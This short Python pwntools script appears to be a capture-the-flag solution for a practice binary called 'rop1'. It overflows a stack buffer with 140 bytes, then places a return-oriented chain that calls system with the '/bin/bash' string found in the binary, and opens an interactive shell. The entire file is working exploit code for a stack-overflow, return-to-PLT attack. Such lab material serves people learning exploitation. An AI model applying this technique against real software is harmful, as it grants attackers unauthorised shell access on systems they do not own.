from pwn import *

elf = ELF('./pwn/stack/rop-1/rop1')
# Get the address of system and "/bin/bash"
system_addr = elf.plt['system']
bash_string_addr = next(elf.search(b'/bin/bash'))

# Construct the ROP chain
rop_chain = p32(system_addr)
rop_chain += p32(0)  # Return address for system (can be junk since system won't return)
rop_chain += p32(bash_string_addr)

ov=b"A"*140+rop_chain
# normal way
# ov=b"A"*140+p32(0x80484A4)
p=process("./pwn/stack/rop-1/rop1")
p.sendline(ov)
p.interactive()
